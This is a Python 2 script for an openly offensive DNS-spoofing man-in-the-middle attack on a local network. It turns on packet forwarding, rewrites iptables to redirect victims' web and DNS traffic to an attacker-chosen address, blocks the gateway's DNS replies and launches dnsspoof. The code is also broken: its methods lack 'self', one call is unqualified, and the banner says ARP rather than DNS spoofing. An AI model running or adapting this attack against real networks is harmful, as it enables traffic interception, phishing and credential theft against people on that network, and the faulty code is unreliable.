from subprocess import check_output
import os

class DNSSpoofing():
	def __init__(self, interface, addressToRedirect):
		self.interface = interface
		self.addressToRedirect = addressToRedirect

	def startAttack(self):
		try:
			cleanRules()	
			self.enableForwarding()
			self.redirectionRules()	
			rdo = check_output(['dnsspoof','-i','eth0'])
		except KeyboardInterrupt:
			raise
		except:
			self.disableForwarding()
			self.cleanRules()

	def enableForwarding():
		'''
			The attacker machine needs to forward the packets between gateway and victim.
		'''
		os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

	def redirectionRules():
		'''
			IPTables rules to redirect the traffic to the specified destination.
			This is important to filter the DNS packets emitted by the gateway.
		'''
		#os.system("echo 0 > /proc/sys/net/ipv4/conf/"+self.interface+"/send_redirects")
		os.system("iptables --flush")
		os.system("iptables --zero")
		os.system("iptables --delete-chain")
		os.system("iptables -F -t nat")
		os.system("iptables --append FORWARD --in-interface "+self.interface+" --jump ACCEPT")
		os.system("iptables --table nat --append POSTROUTING --out-interface "+self.interface+" --jump MASQUERADE")
		os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 --jump DNAT --to-destination "+self.addressToRedirect)
		os.system("iptables -t nat -A PREROUTING -p tcp --dport 443 --jump DNAT --to-destination "+self.addressToRedirect)

		os.system("iptables -A INPUT -p udp -s 0/0 --sport 1024:65535 -d 192.168.1.1 --dport 53 -m state --state NEW,ESTABLISHED -j DROP")
		os.system("iptables -A OUTPUT -p udp -s 192.168.1.1 --sport 53 -d 0/0 --dport 1024:65535 -m state --state ESTABLISHED -j DROP")
		os.system("iptables -A INPUT -p udp -s 0/0 --sport 53 -d 192.168.1.1 --dport 53 -m state --state NEW,ESTABLISHED -j DROP")
		os.system("iptables -A OUTPUT -p udp -s 192.168.1.1 --sport 53 -d 0/0 --dport 53 -m state --state ESTABLISHED -j DROP")

		os.system("iptables -t nat -A PREROUTING -i "+self.interface+" -p udp --dport 53 -j DNAT --to "+self.addressToRedirect)
		os.system("iptables -t nat -A PREROUTING -i "+self.interface+" -p tcp --dport 53 -j DNAT --to "+self.addressToRedirect)

	def cleanRules():
		'''
			Clean the IPTables rules.
		'''
		os.system("iptables --flush")	

	def disableForwarding():
		'''
			Disable the packet forwarding in this machine.
		'''
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

if __name__ == "__main__":
	print "<START ARP SPOOFING>"
	t = DNSSpoofing('eth0','192.168.2.2')
	t.startAttack()
